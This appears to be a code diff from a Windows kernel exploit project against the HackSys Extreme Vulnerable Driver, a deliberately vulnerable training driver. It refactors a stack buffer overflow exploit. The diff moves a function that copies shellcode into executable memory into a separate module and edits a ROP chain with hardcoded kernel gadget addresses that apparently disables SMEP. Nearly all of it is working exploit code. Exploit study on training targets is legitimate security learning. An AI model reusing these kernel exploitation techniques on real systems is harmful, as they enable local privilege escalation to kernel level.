@@ -1,4 +1,4 @@
-#include "ByteVectorUtils.hpp"
+#include "PreExploitation.hpp"
 #include "PostExploitation.hpp"
 #include "HEVDCommunication.hpp"
 #include "BufferOverflowStack.hpp"
@@ -6,27 +6,12 @@
 namespace BufferOverflowStack
 {
 
-Address64 prepare_shellcode()
-{
-	uint32_t pid = GetCurrentProcessId();
-	ByteVector pid_raw = ByteVectorUtils::uint32_to_byte_vector(pid);
-	std::memcpy(SHELLCODE.data() + PID_OFFSET, pid_raw.data(), sizeof(uint32_t));
-
-	Address64 shellcode_address = reinterpret_cast<Address64>(VirtualAlloc(nullptr, PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
-	if (shellcode_address == NULL)
-	{
-		throw WindowsException(ArcaneErrors::ErrorCodes::VirtualAllocFailed);
-	}
-	std::memcpy(reinterpret_cast<void*>(shellcode_address), SHELLCODE.data(), sizeof(SHELLCODE));
-
-	return shellcode_address;
-}
-
 void prepare_rop(ByteVector& in_buffer, Address64 shellcode_address)
 {
-	const size_t return_address_offset = KENREL_BUFFER_SIZE + 0x18;
+	const size_t return_address_offset = KERNEL_BUFFER_SIZE + 0x18;
 	std::memset(in_buffer.data(), 0xAA, return_address_offset);
 
+	// ntos base -> 0xFFFFF804B1000000
 	static constexpr Address64 ZERO_RAX = 0xFFFFF804B168EB5A;
 	static constexpr Address64 MOV_RCX_0xFFFFFFFFF = 0xFFFFF804B12548AC;
 	static constexpr Address64 OR_RAX_RCX = 0xFFFFF804B1246AC6;
@@ -64,12 +49,11 @@ void exploit()
 
 	ByteVector in_buffer;
 	in_buffer.resize(IN_BUFFER_SIZE);
-	std::memset(in_buffer.data(), 0, sizeof(in_buffer));
 
-	Address64 shellcode_address = prepare_shellcode();
+	Address64 shellcode_address = PreExploitation::prepare_shellcode();
 	prepare_rop(in_buffer, shellcode_address);
 
-	OutputDebugStringA(std::to_string(shellcode_address).c_str());
+	DEBUG_PRINT(std::to_string(shellcode_address));
 
 	// TODO: the rop should and rc4 with rax not mov, this enables all mitigations basically
 	// TODO: the shellcode will probably won't work in a live-action scenario because it is really important to not change any other bits
